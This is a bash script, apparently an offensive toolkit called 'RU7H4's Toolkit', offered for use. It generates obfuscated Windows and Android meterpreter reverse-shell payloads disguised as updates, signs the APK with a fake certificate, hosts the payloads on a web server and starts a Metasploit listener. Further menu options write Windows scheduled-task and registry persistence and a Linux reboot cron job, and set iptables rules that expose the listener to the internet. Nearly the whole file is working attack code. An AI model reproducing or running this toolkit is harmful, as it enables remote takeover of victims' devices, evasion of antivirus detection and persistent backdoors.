#!/bin/bash
clear
echo -e "\e[91m"
echo "░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
echo "░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░ ▒▓████████▓▒░▒▓████████▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░    ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░     ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
echo -e "\e[0m"
echo -e "\e[92mRU7H4's Toolkit\e[0m"
echo "-----------------------------------------------------"
if [[ $EUID -ne 0 ]]; then
    echo -e "\e[91m[-] This script must be run as root!\e[0m"
    exit 1
fi
LHOST=$(hostname -I | awk '{print $1}')
echo -e "\e[94m[1] Devices (Windows/Android)\e[0m"
echo -e "\e[94m[2] Post-Exploitation\e[0m"
echo -e "\e[94m[3] Port Forwarding\e[0m"
read -p "Select an option (1-3): " MAIN_OPTION
if [[ $MAIN_OPTION -eq 1 ]]; then
    echo -e "\e[93m[1] Windows\e[0m"
    echo -e "\e[93m[2] Android\e[0m"
    read -p "Select a device type (1 or 2): " DEVICE_TYPE
    if [[ $DEVICE_TYPE -eq 1 ]]; then
        read -p "Enter LPORT (Listening Port): " LPORT
        read -p "Enter the output payload name (e.g., update.exe): " PAYLOAD_NAME
        echo "[+] Generating Windows payload with obfuscation..."
        if ! command -v msfvenom &>/dev/null; then
            echo "[-] msfvenom is not installed. Please install Metasploit."
            exit 1
        fi
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT \
            -e x86/shikata_ga_nai -i 10 -f exe -o raw_$PAYLOAD_NAME
        if [ ! -s raw_$PAYLOAD_NAME ]; then
            echo "[-] Payload generation failed. Check msfvenom parameters."
            exit 1
        fi
        echo "[+] Obfuscating payload..."
        if command -v upx &>/dev/null; then
            upx --best --lzma raw_$PAYLOAD_NAME -o $PAYLOAD_NAME
            rm raw_$PAYLOAD_NAME
        else
            echo "[!] UPX not installed, renaming raw payload."
            mv raw_$PAYLOAD_NAME $PAYLOAD_NAME
        fi
        if ! command -v apache2 &>/dev/null; then
            echo "[+] Installing Apache..."
            apt install -y apache2
        fi
        systemctl start apache2
        systemctl enable apache2
        WEB_DIR="/var/www/html"
        mv $PAYLOAD_NAME $WEB_DIR/
        echo "[+] Payload hosted at: http://$LHOST/$PAYLOAD_NAME"
        cat <<EOF > listener.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF
        echo "[+] Metasploit Listener script saved as listener.rc"
        echo "[+] Starting Metasploit Listener..."
        msfconsole -r listener.rc
    elif [[ $DEVICE_TYPE -eq 2 ]]; then
        read -p "Enter LPORT (Listening Port): " LPORT
        read -p "Enter the output APK name (e.g., update.apk): " PAYLOAD_NAME
        echo "[+] Generating Android payload with obfuscation..."
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o raw_$PAYLOAD_NAME
        if [ ! -s raw_$PAYLOAD_NAME ]; then
            echo "[-] Payload generation failed. Check msfvenom parameters."
            exit 1
        fi
        echo "[+] Obfuscating APK using APKTool..."
        if command -v apktool &>/dev/null; then
            apktool d raw_$PAYLOAD_NAME -o temp_apk
            apktool b temp_apk -o $PAYLOAD_NAME
            rm -rf temp_apk raw_$PAYLOAD_NAME
        else
            echo "[!] APKTool not installed, skipping obfuscation."
            mv raw_$PAYLOAD_NAME $PAYLOAD_NAME
        fi
        echo "[+] Signing APK with fake certificate..."
        if command -v jarsigner &>/dev/null; then
            keytool -genkey -v -keystore fake.keystore -alias android -keyalg RSA -keysize 2048 -validity 10000 -storepass password -keypass password -dname "CN=Android"
            jarsigner -verbose -keystore fake.keystore -storepass password -keypass password $PAYLOAD_NAME android
            rm fake.keystore
        else
            echo "[!] jarsigner not installed, skipping signing."
        fi
        if ! command -v apache2 &>/dev/null; then
            echo "[+] Installing Apache..."
            apt install -y apache2
        fi
        systemctl start apache2
        systemctl enable apache2
        WEB_DIR="/var/www/html"
        mv $PAYLOAD_NAME $WEB_DIR/
        echo "[+] Payload hosted at: http://$LHOST/$PAYLOAD_NAME"
        cat <<EOF > listener.rc
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF
        echo "[+] Metasploit Listener script saved as listener.rc"
        echo "[+] Starting Metasploit Listener..."
        msfconsole -r listener.rc
    else
        echo "[-] Invalid device option!"
        exit 1
    fi
elif [[ $MAIN_OPTION -eq 2 ]]; then
    echo -e "\e[93m[+] Post-Exploitation Options:\e[0m"
    echo -e "\e[92m[1] Windows Persistence\e[0m"
    echo -e "\e[92m[2] Linux Persistence\e[0m"
    echo -e "\e[92m[3] Android Persistence\e[0m"
    read -p "Select an option (1-3): " PERSIST_OPTION
    if [[ $PERSIST_OPTION -eq 1 ]]; then
        read -p "Enter payload name (e.g., backdoor.exe): " PAYLOAD_NAME
        echo "[+] Setting up Windows persistence..."
        cat <<EOF > win_persist.bat
@echo off
schtasks /create /tn "WindowsUpdate" /tr "\"C:\\Users\\Public\\$PAYLOAD_NAME\"" /sc ONLOGON /rl HIGHEST
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Update" /t REG_SZ /d "\"C:\\Users\\Public\\$PAYLOAD_NAME\""
EOF
        echo "[+] Persistence script saved as win_persist.bat"
    elif [[ $PERSIST_OPTION -eq 2 ]]; then
        read -p "Enter payload name (e.g., backdoor): " PAYLOAD_NAME
        echo "[+] Setting up Linux persistence..."
        cat <<EOF > linux_persist.sh
#!/bin/bash
echo "@reboot /usr/local/bin/$PAYLOAD_NAME" | crontab -
EOF
        chmod +x linux_persist.sh
        echo "[+] Persistence script saved as linux_persist.sh"
    elif [[ $PERSIST_OPTION -eq 3 ]]; then
        read -p "Enter payload name (e.g., backdoor.apk): " PAYLOAD_NAME
        echo "[+] Android persistence setup requires additional steps on the target device."
    else
        echo "[-] Invalid persistence option!"
        exit 1
    fi
elif [[ $MAIN_OPTION -eq 3 ]]; then
    echo "[+] Setting up port forwarding to make the port accessible over the internet..."
    read -p "Enter local port: " LOCAL_PORT
    if lsof -i :$LOCAL_PORT >/dev/null; then
        echo "[!] Port $LOCAL_PORT is already in use. Please choose another port."
        exit 1
    fi
    sysctl -w net.ipv4.ip_forward=1
    iptables -t nat -A PREROUTING -p tcp --dport $LOCAL_PORT -j DNAT --to-destination 127.0.0.1:$LOCAL_PORT
    iptables -A FORWARD -p tcp --dport $LOCAL_PORT -j ACCEPT
    iptables-save > /etc/iptables/rules.v4
    PUBLIC_IP=$(curl -s ifconfig.me)
    echo "[+] Port $LOCAL_PORT is now accessible over the internet."
    echo "[+] Use your public IP address ($PUBLIC_IP) to access this port."
    echo "[+] You can test it by accessing: http://$PUBLIC_IP:$LOCAL_PORT"
    echo -e "\e[92m[+] Don't forget to configure port $LOCAL_PORT on your router.\e[0m"
fi
